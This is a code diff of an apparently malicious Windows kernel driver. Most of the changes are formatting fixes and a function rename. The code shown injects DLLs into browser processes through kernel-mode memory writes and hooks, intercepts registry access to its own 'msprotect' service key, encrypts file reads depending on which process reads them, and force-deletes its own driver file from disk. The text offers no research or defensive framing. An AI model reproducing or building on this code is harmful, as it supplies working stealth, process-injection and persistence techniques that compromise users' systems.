@@ -165,12 +165,12 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 #else
 #endif
 
-	
 
-    ZwQueryInformationProcess =(QUERY_INFO_PROCESS) GetSystemRoutineAddress(L"ZwQueryInformationProcess");
+
+    ZwQueryInformationProcess = (QUERY_INFO_PROCESS) GetSystemRoutineAddress(L"ZwQueryInformationProcess");
     PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
     PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
-    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p ZwQueryInformationProcess:%p", PsGetProcessPeb, PsGetProcessWow64Process,ZwQueryInformationProcess);
+    DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p ZwQueryInformationProcess:%p", PsGetProcessPeb, PsGetProcessWow64Process, ZwQueryInformationProcess);
     if (NT_SUCCESS(BBSearchPattern(PreviousModePattern, 0xCC, sizeof(PreviousModePattern) - 1, fnExGetPreviousMode, 32, &pFoundPattern))) {
         g_mode = *(PULONG)((PUCHAR)pFoundPattern - 2);
         kprintf("[DriverEntry] g_mode:%x fnExGetPreviousMode:%p\n", g_mode, fnExGetPreviousMode);
@@ -341,14 +341,14 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
         if (MmIsAddressValid(processParam->CommandLine.Buffer)) {
             int Len = processParam->CommandLine.Length >= 1024 ? 1023 : processParam->CommandLine.Length;
             RtlCopyMemory(name, processParam->CommandLine.Buffer, Len);
-            
+
             return TRUE;
         }
-		
+
     }
     __except(EXCEPTION_EXECUTE_HANDLER) {
         ULONG code = GetExceptionCode();
-        //      kprintf("[GetProcessNameByObj] this is __except");
+        //      kprintf("[GetNameByObj] this is __except");
     }
 
 #else
@@ -392,178 +392,51 @@ BOOLEAN GetCommandLine(PEPROCESS ProcessObj, WCHAR name[])
 }
 
 
-BOOLEAN GetProcessNameByObj(PEPROCESS ProcessObj, WCHAR *name)
-	{
-		PPEB pPEB = NULL;
-		if (g_offset_name) {
-	
-			ULONG_PTR SEAuditValue = *(PULONG_PTR)((PUCHAR)ProcessObj + g_offset_name);
-			//获取_OBJECT_NAME_INFORMATION指针
-			PULONG_PTR pNameInfo = (PULONG_PTR)SEAuditValue;
-			if (MmIsAddressValid(pNameInfo)) {
-				PUNICODE_STRING lpPath =  (PUNICODE_STRING)(PVOID)pNameInfo;
-				WCHAR *pfind = NULL;
-				pfind = wcsrchr(lpPath->Buffer, L'\\');
-				if (pfind) {
-					pfind++;
-					wcscpy(name, pfind);
-					_wcslwr(name, wcslen(name));
-					return TRUE;
-				}
-				LOG(LOGFL_INFO,( "[GetProcessNameByObj] lpPath:%wZ", lpPath));
-			}
-	
-		}
-	
-	
-	
-	
-	
-	//
-	//
-	//	  if (KeGetCurrentIrql() != PASSIVE_LEVEL)
-	//	  {
-	//
-	//		   LOG(LOGFL_INFO,("this is less level"));
-	////		ANSI_STRING AnsiString2;
-	////		UNICODE_STRING UnicodeString2;
-	////		CHAR *pData = PsGetProcessImageFileName(ProcessObj);
-	////		CHAR  pFind = NULL;
-	////		CHAR pname[216] = { 0 };
-	////		WCHAR pexe[512] = { 0 };
-	////		NTSTATUS  status = -1;
-	////		strcpy(pname, pData);
-	//////		_strlwr(pname, 216);
-	//////
-	//////		pFind =    strstr(pname, ".exe");
-	//////		if (pFind)
-	//////		{
-	//////			ULONG pos = strlen(".exe") + 1;
-	//////			PUCHAR pEnd =  pFind + pos;
-	//////			*pEnd = '\0';
-	//////		}
-	////		LOG(LOGFL_INFO,("[GetProcessNameByObj] this is less level name:%s",pname));
-	////		RtlInitString(&AnsiString2, pname);
-	////		status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
-	////
-	////		if (NT_SUCCESS(status))
-	////		{
-	////			wcscpy(name, UnicodeString2.Buffer);
-	////			RtlFreeUnicodeString(&UnicodeString2);
-	////			return TRUE;
-	////		}
-	//		  return FALSE;
-	//	  }
-	//	  pPEB = PsGetProcessPeb != NULL ? PsGetProcessPeb(ProcessObj) : NULL;
-	//	  if (pPEB == NULL) return FALSE;
-	//#ifdef _AMD64_
-	//
-	//	  try
-	//	  {
-	//		  PPEB64 peb64 = (PPEB64)pPEB;
-	//		  ULONG64 p1 = 0;
-	//		  ULONG64 uCommandline = 0;
-	//		  ULONG64 uImagepath = 0;
-	//		  ULONG type = 0;
-	//		  PUNICODE_STRING pCommandline = NULL;
-	//		  UNICODE_STRING pImagePath = { 0 };
-	//		  UNICODE_STRING tempcommand = { 0 };
-	//		  WCHAR pexe[512] = { 0 };
-	//		  PRTL_USER_PROCESS_PARAMETERS64 processParam = (PRTL_USER_PROCESS_PARAMETERS64)peb64->ProcessParameters;
-	//		  //kprintf("[GetProcessNameByObj] ImagePathName:%ws",processParam->ImagePathName.Buffer);
-	//		  if (MmIsAddressValid(processParam) == FALSE || processParam->ImagePathName.Length > 512)
-	//		  {
-	//			  return FALSE;
-	//		  }
-	//		  if (MmIsAddressValid(processParam->ImagePathName.Buffer))
-	//		  {
-	//
-	//			  WCHAR *pfind = NULL;
-	//			  WCHAR *pexefind = NULL;
-	//			  RtlCopyMemory(pexe, (void *)processParam->ImagePathName.Buffer, processParam->ImagePathName.Length);
-	//			  pfind = wcsrchr(pexe, L'\\');
-	//			  if (pfind)
-	//			  {
-	//				  pfind++;
-	//				  wcscpy(name, pfind);
-	//				  return TRUE;
-	//			  }
-	//		  }
-	//	  }
-	//	  __except(EXCEPTION_EXECUTE_HANDLER)
-	//	  {
-	//		  ULONG code = GetExceptionCode();
-	//		  //	  kprintf("[GetProcessNameByObj] this is __except");
-	//	  }
-	//
-	//#else
-	//
-	//	  try
-	//	  {
-	//
-	//		  PPEB32 peb32 = (PPEB32)pPEB;
-	//		  ULONG32 p1 = 0;
-	//		  ULONG32 uCommandline = 0;
-	//		  ULONG32 uImagepath = 0;
-	//		  ULONG type = 0;
-	//		  PUNICODE_STRING32 pCommandline = NULL;
-	//		  UNICODE_STRING32 pImagePath = { 0 };
-	//		  UNICODE_STRING32 tempcommand;
-	//		  WCHAR pexe[512] = { 0 };
-	//
-	//		  ULONG ImageBuffeLen = 259;
-	//		  WCHAR *pImageBuffer = NULL;
-	//		  PRTL_USER_PROCESS_PARAMETERS32 processParam = NULL;
-	//		  if (pPEB == NULL) return FALSE;
-	//
-	//		  processParam = (PRTL_USER_PROCESS_PARAMETERS32)peb32->ProcessParameters;
-	//
-	//		  if (MmIsAddressValid(processParam) == FALSE)
-	//		  {
-	//			  return FALSE;
-	//		  }
-	//
-	//		  pImageBuffer = processParam->ImagePathName.Buffer;
-	//		  ImageBuffeLen = processParam->ImagePathName.Length;
-	//
-	//		  if (MmIsAddressValid((PVOID)pImageBuffer) && ImageBuffeLen < 512)
-	//		  {
-	//			  WCHAR *pfind = NULL;
-	//			  RtlCopyMemory(pexe, (void *)pImageBuffer, ImageBuffeLen);
-	//			  pfind = wcsrchr(pexe, L'\\');
-	//			  if (pfind)
-	//			  {
-	//				  pfind++;
-	//				  wcscpy(name, pfind);
-	//				  _wcslwr(name, wcslen(name));
-	//				  return TRUE;
-	//			  }
-	//		  } else
-	//		  {
-	//			  ULONG_PTR pexebuf = (ULONG_PTR)pImageBuffer + (ULONG_PTR)processParam;
-	//			  if (MmIsAddressValid((PVOID)pexebuf))
-	//			  {
-	//				  WCHAR *pfind = NULL;
-	//				  RtlCopyMemory(pexe, (PVOID)pexebuf, ImageBuffeLen);
-	//				  pfind = wcsrchr(pexe, L'\\');
-	//				  if (pfind)
-	//				  {
-	//					  pfind++;
-	//					  wcscpy(name, pfind);
-	//					  _wcslwr(name, wcslen(name));
-	//					  return TRUE;
-	//				  }
-	//			  }
-	//		  }
-	//	  }
-	//	  __except(EXCEPTION_EXECUTE_HANDLER)
-	//	  {
-	//		  ULONG code = GetExceptionCode();
-	//	  }
-	//
-	//#endif
-		return FALSE;
-	}
+BOOLEAN GetNameByObj(PEPROCESS ProcessObj, WCHAR *name)
+{
+
+    KIRQL irql = KeGetCurrentIrql();
+
+    if(irql != PASSIVE_LEVEL) {
+
+        //        LOG(LOGFL_INFO,( "[GetNameByObj] This is Less IRQL:%d PASSIVE_LEVEL:%d",irql,PASSIVE_LEVEL));
+    }
+
+    if (g_offset_name) {
+        ULONG_PTR SEAuditValue = *(PULONG_PTR)((ULONG_PTR)ProcessObj + g_offset_name);
+        //获取_OBJECT_NAME_INFORMATION指针
+        PULONG_PTR pNameInfo = (PULONG_PTR)SEAuditValue;
+        PUNICODE_STRING lpPath =  (PUNICODE_STRING)(PVOID)pNameInfo;
+
+
+
+        if (MmIsAddressValid(lpPath)) {
+
+            if (lpPath->Buffer == NULL) {
+                LOG(LOGFL_INFO, ( "[GetNameByObj] This is NULL irql:%d pNameInfo:%wZ", irql, pNameInfo));
+            } else {
+
+
+                WCHAR *pfind = NULL;
+                pfind = wcsrchr(lpPath->Buffer, L'\\');
+                if (pfind) {
+                    pfind++;
+                    wcscpy(name, pfind);
+                    return TRUE;
+
+                }
+
+                //              LOG(LOGFL_INFO,( "[GetNameByObj] irql:%d pNameInfo:%wZ", irql,pNameInfo));
+
+            }
+
+        }
+
+    }
+
+    return FALSE;
+}
+
 
 VOID CleanVolumCtx(
     IN PFLT_CONTEXT Context,
@@ -597,7 +470,7 @@ Return Value:
             ctx = (PVOLUME_CONTEXT)Context;
             if (ctx->Name.Buffer != NULL) {
 
-                kprintf("[CleanVolumCtx] free volumName:%wZ",&ctx->Name);
+                kprintf("[CleanVolumCtx] free volumName:%wZ", &ctx->Name);
                 ExFreePool(ctx->Name.Buffer);
                 ctx->Name.Buffer = NULL;
             }
@@ -620,7 +493,7 @@ Return Value:
             if (NULL != streamCtx->Resource) {
                 ExDeleteResourceLite(streamCtx->Resource);
                 ExFreePoolWithTag(streamCtx->Resource, RESOURCE_TAG);
-                
+
             }
         }
         break;
@@ -651,7 +524,7 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
             //
             //  We could not allocate a context, quit now
             //
-            
+
             leave;
         }
 
@@ -706,7 +579,7 @@ NTSTATUS InstanceSetup(IN PCFLT_RELATED_OBJECTS FltObjects, IN FLT_INSTANCE_SETU
         //
         //  Set the context
         //
-        LOG(LOGFL_INFO,("[InstanceSetup]  Name:%ws",ctx->Name.Buffer));
+        LOG(LOGFL_INFO, ("[InstanceSetup]  Name:%ws", ctx->Name.Buffer));
         status = FltSetVolumeContext(FltObjects->Volume, FLT_SET_CONTEXT_KEEP_IF_EXISTS, ctx, NULL);
         if (status == STATUS_FLT_CONTEXT_ALREADY_DEFINED) {
 
@@ -1028,14 +901,14 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
         //fast io path, disallow it, this will lead to an equivalent irp request coming in
         if (FLT_IS_FASTIO_OPERATION(Data)) {
             // disallow fast io path
-            LOG(LOGFL_INFO,( "[PreRead] FLT_PREOP_DISALLOW_FASTIO"));
+            LOG(LOGFL_INFO, ( "[PreRead] FLT_PREOP_DISALLOW_FASTIO"));
             retValue = FLT_PREOP_DISALLOW_FASTIO;
             __leave;
         }
 
         //cached io irp path
         if (!(Data->Iopb->IrpFlags & (IRP_NOCACHE | IRP_PAGING_IO | IRP_SYNCHRONOUS_PAGING_IO))) {
-            LOG(LOGFL_INFO,( "[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO IrpFlags:%x", Data->Iopb->IrpFlags));
+            LOG(LOGFL_INFO, ( "[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO IrpFlags:%x", Data->Iopb->IrpFlags));
             __leave;
         }
 
@@ -1107,7 +980,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS
         //  Update the buffer pointers and MDL address, mark we have changed
         //  something.
         //
-        LOG(LOGFL_INFO, ("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p pStreamCtx:%p", p2pCtx, newBuf, newMdl,pStreamCtx));
+        LOG(LOGFL_INFO, ("[PreRead]  p2pCtx:%p newBuf:%p newMdl:%p pStreamCtx:%p", p2pCtx, newBuf, newMdl, pStreamCtx));
         iopb->Parameters.Read.ReadBuffer = newBuf;
         iopb->Parameters.Read.MdlAddress = newMdl;
         FltSetCallbackDataDirty(Data);
@@ -1190,10 +1063,10 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
                 Data->IoStatus.Information = 0;
                 leave;
             }
-            LOG(LOGFL_INFO, ("[PostRead] pid:%d MmGetSystemAddressForMdlSafe ",pid));
+            LOG(LOGFL_INFO, ("[PostRead] pid:%d MmGetSystemAddressForMdlSafe ", pid));
         } else if (FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_SYSTEM_BUFFER) || FlagOn(Data->Flags, FLTFL_CALLBACK_DATA_FAST_IO_OPERATION)) {
             origBuf = iopb->Parameters.Read.ReadBuffer;
-            LOG(LOGFL_INFO, ("[PostRead] pid:%d FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION",pid));
+            LOG(LOGFL_INFO, ("[PostRead] pid:%d FLTFL_CALLBACK_DATA_SYSTEM_BUFFER|FLTFL_CALLBACK_DATA_FAST_IO_OPERATION", pid));
         } else {
 
             //            DbgPrint("[PostRead] call FltDoCompletionProcessingWhenSafe");
@@ -1220,28 +1093,28 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //  so we are in the proper context.  Copy the data handling an
         //  exception.
         //
-        LOG(LOGFL_INFO, ("[PostRead] pid:%d p2pCtx:%p SwappedBuffer:%p pStreamCtx:%p pMdl:%p  Len:%d file:%ws",pid,p2pCtx,p2pCtx->SwappedBuffer,p2pCtx->pStreamCtx,
-                         p2pCtx->pMdl,Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
+        LOG(LOGFL_INFO, ("[PostRead] pid:%d p2pCtx:%p SwappedBuffer:%p pStreamCtx:%p pMdl:%p  Len:%d file:%ws", pid, p2pCtx, p2pCtx->SwappedBuffer, p2pCtx->pStreamCtx,
+                         p2pCtx->pMdl, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
         try {
 
             PUCHAR   pOrigBuf = (PUCHAR)origBuf;
             //除去explorer 全加密
             if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws",pid,Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
+                LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
                 EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
             } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                PEPROCESS ProcessObj=NULL;
+                PEPROCESS ProcessObj = NULL;
                 if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
 
                     WCHAR exename[512] = { 0 };
-                    BOOLEAN bgetname = GetProcessNameByObj(ProcessObj, exename);
+                    BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
                     if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
 
                     if (_wcsicmp(exename, g_HexConfig[5]) == 0 || _wcsicmp(exename, g_HexConfig[6]) == 0) {
-                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is not encrypte  filename:%ws",pid,PsGetCurrentProcessId(),exename,p2pCtx->pStreamCtx->FileName.Buffer));
+                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is not encrypte  filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
                         EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
                     } else {
-                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is  encrypte  filename:%ws",pid,PsGetCurrentProcessId(),exename,p2pCtx->pStreamCtx->FileName.Buffer));
+                        LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws  this is  encrypte  filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
                         EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                     }
                 }
@@ -1322,22 +1195,22 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe(IN OUT PFLT_CALLBACK_DATA Data, IN P
                 PUCHAR   pOrigBuf = (PUCHAR)origBuf;
                 //除去explorer 全加密
                 if (p2pCtx->pStreamCtx->uEncrypteType == 1) {
-                    LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws",pid,Data->IoStatus.Information,p2pCtx->pStreamCtx->FileName.Buffer));
+                    LOG(LOGFL_INFO, ("[PostRead] pid:%d encrypte len:%d file:%ws", pid, Data->IoStatus.Information, p2pCtx->pStreamCtx->FileName.Buffer));
                     EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                 } else if (p2pCtx->pStreamCtx->uEncrypteType == 2) {
-                    PEPROCESS ProcessObj=NULL;
+                    PEPROCESS ProcessObj = NULL;
 
                     if (NT_SUCCESS(PsLookupProcessByProcessId(pid, &ProcessObj))) {
 
                         WCHAR exename[512] = { 0 };
-                        BOOLEAN bgetname = GetProcessNameByObj(ProcessObj, exename);
+                        BOOLEAN bgetname = GetNameByObj(ProcessObj, exename);
                         if (ProcessObj != NULL) ObfDereferenceObject(ProcessObj);
 
                         if (_wcsicmp(exename, g_HexConfig[5]) == 0 || _wcsicmp(exename, g_HexConfig[6]) == 0) {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is not encrypte filename:%ws",pid,PsGetCurrentProcessId(),exename,p2pCtx->pStreamCtx->FileName.Buffer));
+                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is not encrypte filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
                             EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, FALSE);
                         } else {
-                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is  encrypte filename:%ws",pid,PsGetCurrentProcessId(),exename,p2pCtx->pStreamCtx->FileName.Buffer));
+                            LOG(LOGFL_INFO, ("[PostRead] pid:%d PsGetCurrentProcessId():%d exename:%ws this is  encrypte filename:%ws", pid, PsGetCurrentProcessId(), exename, p2pCtx->pStreamCtx->FileName.Buffer));
                             EncodeBuffer(p2pCtx->SwappedBuffer, origBuf, Data->IoStatus.Information, TRUE);
                         }
                     }
@@ -1423,7 +1296,7 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
                         if (wcsstr(pslr, g_HexConfig[12])) {
                             //L"shelliconoverlayidentifiers\\0overlayIcon"
                         LABEL1:
-                            bGetName = GetProcessNameByObj(PsGetCurrentProcess(), exename);
+                            bGetName = GetNameByObj(PsGetCurrentProcess(), exename);
                             if (bGetName && _wcsicmp(g_HexConfig[5], exename) != 0) {
                                 //L"explorer.exe"
                                 BOOLEAN bRedirect = TRUE;
@@ -1449,7 +1322,7 @@ NTSTATUS RegCallBack(PVOID CallbackContext, PVOID Argument1, PVOID Argument2)
 
                         if (wcsstr(pslr, g_HexConfig[11]) != NULL) {
                             //L"services\\msprotect"
-                            BOOLEAN bGetName = GetProcessNameByObj(PsGetCurrentProcess(), exename);
+                            BOOLEAN bGetName = GetNameByObj(PsGetCurrentProcess(), exename);
                             if (bGetName && _wcsicmp(g_HexConfig[13], exename) != 0) {
                                 kprintf("exename:%ws Path:%wZ", exename, pPath);
                                 kprintf("DesiredAccess:%x  GrantedAccess:%x  Disposition:%x CreateOptions:%x", KeyInfo->DesiredAccess, KeyInfo->GrantedAccess, KeyInfo->Disposition, KeyInfo->CreateOptions);
@@ -1782,7 +1655,7 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
         _wcslwr(pTempBuf);
         ProcessObj = PsGetCurrentProcess();
 
-        if (g_offset_name==0) {
+        if (g_offset_name == 0) {
             g_offset_name = GetNameOffset(ProcessObj);
         }
 
@@ -1790,7 +1663,7 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
         //x64 add code
         pPEB = PsGetProcessWow64Process(ProcessObj);
         if (wcsstr(pTempBuf, L"\\syswow64\\") != NULL) {
-            bGet = GetProcessNameByObj(ProcessObj, exename);
+            bGet = GetNameByObj(ProcessObj, exename);
             if (bGet && _wcsicmp(exename, L"") != NULL) {
 
                 bFindExe = FindInBrowser(exename);
@@ -1812,7 +1685,7 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
         } else {
             if (pPEB == NULL) {
                 pPEB = PsGetProcessPeb(ProcessObj);
-                bGet = GetProcessNameByObj(ProcessObj, exename);
+                bGet = GetNameByObj(ProcessObj, exename);
                 bFindExe = FindInBrowser(exename);
                 if (bFindExe) {
                     BOOLEAN bGetCommand = FALSE;
@@ -1833,7 +1706,7 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
         //x86 add code
 
         pPEB = PsGetProcessPeb(ProcessObj);
-        bGet = GetProcessNameByObj(ProcessObj, exename);
+        bGet = GetNameByObj(ProcessObj, exename);
         LOG(LOGFL_INFO, ("[ImageNotify] pid:%d x86 inject %ws", ProcessId, exename));
         bFindExe = FindInBrowser(exename);
         if (bFindExe) {
@@ -1844,7 +1717,7 @@ VOID ImageNotify(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO Im
                 PWCHAR pchrome = wcsstr(CommandLine, L"renderer");
                 PWCHAR pFirefox = wcsstr(CommandLine, L"contentproc");
                 if (pchrome == NULL && pFirefox == NULL) {
-                    LOG(LOGFL_INFO, ("[ImageNotify] pid:%d(%x) x86 inject %ws CommandLine:%ws",ProcessId, ProcessId, exename,CommandLine));
+                    LOG(LOGFL_INFO, ("[ImageNotify] pid:%d(%x) x86 inject %ws CommandLine:%ws", ProcessId, ProcessId, exename, CommandLine));
                     InjectDll(ProcessObj, 32);
                 }
             }
@@ -1914,7 +1787,7 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
 {
     NTSTATUS status = -1;
     if (NtWriteVirtualMemory && m_pCreateThread && NtProtectVirtualMemory) {
-        HANDLE ProcessHandle = (HANDLE)-1;
+        HANDLE ProcessHandle = (HANDLE) - 1;
         PVOID dllbase = NULL;
         ULONG_PTR ZeroBits = 0;
         SIZE_T sizeDll = ibit == 64 ? g_iDll64 : g_iDll32;
@@ -2012,7 +1885,7 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
                     }
                 }
                 memcpy(pCall, restorcode, numcode);
-                LOG(LOGFL_INFO, ("[InjectDll] pCall:%p lencode:%d origincode:%p",pCall,lencode,origincode));
+                LOG(LOGFL_INFO, ("[InjectDll] pCall:%p lencode:%d origincode:%p", pCall, lencode, origincode));
                 pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
                 //调用call
                 *(ULONG32 *)&callmemload[3] = (ULONG32)pParambase;
@@ -2205,7 +2078,7 @@ void InitGlobeFunc(PIMAGE_INFO ImageInfo)
         if (IsX64Module(ImageInfo->ImageBase)) {
             fnHookfunc64 = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
             if (fnHookfunc64) {
-                memcpy(pOldCode64,fnHookfunc64,20);
+                memcpy(pOldCode64, fnHookfunc64, 20);
             }
 
 
@@ -2219,7 +2092,7 @@ void InitGlobeFunc(PIMAGE_INFO ImageInfo)
         if (!IsX64Module(ImageInfo->ImageBase)) {
             fnHookfunc = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
             if (fnHookfunc) {
-                memcpy(pOldCode32,fnHookfunc,20);
+                memcpy(pOldCode32, fnHookfunc, 20);
             }
 
             kprintf("[InitGlobeFunc] fnHookfunc32:%p", fnHookfunc);
@@ -2286,13 +2159,13 @@ PMY_COMMAND_INFO FindInList(const WCHAR *name, LIST_ENTRY *link, PKSPIN_LOCK loc
 
 BOOLEAN  FindInBrowser(const WCHAR *name)
 {
-    BOOLEAN  bRet=FALSE;
-    ULONG i=0;
+    BOOLEAN  bRet = FALSE;
+    ULONG i = 0;
 
-    for(i=0; i<g_iBrowser; i++) {
+    for(i = 0; i < g_iBrowser; i++) {
 
-        if(_wcsicmp(g_HexBrowser[i],name)==0) {
-            bRet=TRUE;
+        if(_wcsicmp(g_HexBrowser[i], name) == 0) {
+            bRet = TRUE;
             break;
         }
     }
@@ -2621,7 +2494,7 @@ ULONG GetAsmSize(PUCHAR Address, int asmlen)
     ULONG   dw;
     Disasm  dis;
     ULONG   DecodedLength = 0;
-    int lencode=0;
+    int lencode = 0;
     while(DecodedLength < asmlen) {
         int  dw = DisasmCode((PUCHAR)((PUCHAR)Address + DecodedLength), asmlen, &dis);
         DecodedLength = DecodedLength + dw;
@@ -2650,7 +2523,7 @@ BOOLEAN isContained(const char *str, char c)
 
 
 //*save_ptr等价于以前的静态指针
-char *myStrtok_r(char* string_org,const char* demial, char **save_ptr)
+char *myStrtok_r(char* string_org, const char* demial, char **save_ptr)
 {
     char *str = NULL;         //返回的字符串
     const char *ctrl = demial; //分隔符
@@ -2757,12 +2630,12 @@ NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObjec
 NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO_STATUS_BLOCK pIoStatusBlock, PFILE_OBJECT * pFileObject)
 {
 
-    NTSTATUS ntStatus=-1;
-    PIRP pIrp=NULL;
-    KEVENT kEvent= {0};
-    static ACCESS_STATE AccessState= {0};
-    static AUX_ACCESS_DATA AuxData= {0};
-    OBJECT_ATTRIBUTES ObjectAttributes= {0};
+    NTSTATUS ntStatus = -1;
+    PIRP pIrp = NULL;
+    KEVENT kEvent = {0};
+    static ACCESS_STATE AccessState = {0};
+    static AUX_ACCESS_DATA AuxData = {0};
+    OBJECT_ATTRIBUTES ObjectAttributes = {0};
     PFILE_OBJECT  pNewFileObject;
     IO_SECURITY_CONTEXT SecurityContext;
     PIO_STACK_LOCATION IrpSp;
@@ -2863,7 +2736,7 @@ NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO
     IoSetCompletionRoutine(pIrp, IoCompletionRoutineEx, 0, TRUE, TRUE, TRUE);
     polddev = IoGetBaseFileSystemDeviceObject(pNewFileObject);
     ntStatus = IoCallDriver(polddev, pIrp);
-    
+
     //     DbgPrint("polddev:%p", polddev);
     //
     if(polddev) {
@@ -2977,16 +2850,16 @@ NTSTATUS IrpClose(PFILE_OBJECT  pFileObject)
 void DeleteMyself(PDRIVER_OBJECT pDriverObj)
 {
     PFILE_OBJECT pFileObject = NULL;
-    NTSTATUS status=-1;
+    NTSTATUS status = -1;
     IO_STATUS_BLOCK IoStatusBlock = {0};
     PKLDR_DATA_TABLE_ENTRY ldrentry =      (PKLDR_DATA_TABLE_ENTRY)pDriverObj->DriverSection;
-    DbgPrint("[DeleteMyself] FullDllName:%ws",ldrentry->FullDllName.Buffer);
-    status=IrpCreateFile(&ldrentry->FullDllName, DELETE, &IoStatusBlock, &pFileObject);
+    DbgPrint("[DeleteMyself] FullDllName:%ws", ldrentry->FullDllName.Buffer);
+    status = IrpCreateFile(&ldrentry->FullDllName, DELETE, &IoStatusBlock, &pFileObject);
     if (NT_SUCCESS(status)) {
         IrpDeleteFileForce(pFileObject);
-        status=IrpClose(pFileObject);
+        status = IrpClose(pFileObject);
     } else {
-        DbgPrint("[DriverEntry] call IrpCreateFile error status:%x",status);
+        DbgPrint("[DriverEntry] call IrpCreateFile error status:%x", status);
     }
 
     //   ZwDeleteFileFolder(ldrentry->FullDllName.Buffer);
@@ -3018,10 +2891,10 @@ NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
     status = IrpSetFileAttributes(pFileObject, &IoStatusBlock, &FileInformationAttribute, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation, TRUE);
     if (!NT_SUCCESS(status))return status;
 
-	
+
 
     //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
-    DeviceObject=IoGetBaseFileSystemDeviceObject(pFileObject);
+    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
     if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
 
     //
@@ -3034,7 +2907,7 @@ NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
     //
     FileInformationDelete.DeleteFile = TRUE;
 
-	
+
     //
     pIrp->AssociatedIrp.SystemBuffer = &FileInformationDelete;
     pIrp->UserEvent = &SycEvent;
@@ -3093,16 +2966,16 @@ NTSTATUS IrpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoSta
